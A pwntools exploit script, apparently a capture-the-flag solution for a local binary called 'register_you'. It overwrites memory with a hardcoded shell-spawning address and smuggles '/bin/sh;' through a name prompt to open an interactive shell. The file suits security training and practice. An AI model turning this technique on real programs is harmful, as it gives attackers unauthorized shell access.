#!/usr/bin/python
# coding: utf-8

from pwn import *

get_shell = 0x000000000040080F

def select_menu(p, num):
    p.recvuntil('4.exit\n')
    p.sendline(str(num))

def register(p):
    p.recvuntil('What is your name? :)\n')
    p.sendline('ch4n3')

    p.recvuntil('Input your age : \n')
    p.sendline('1024')


def main():
    e = ELF('./register_you')
    p = process(e.path)

    select_menu(p, 3)

    payload = p64(get_shell) * 5

    p.recvuntil('Input your memo : \n')
    p.sendline(payload)
    p.sendline('1')

    p.recvuntil('What is your name? :)\n')
    p.sendline('/bin/sh;')
    p.interactive()

if __name__ == '__main__':
    main()

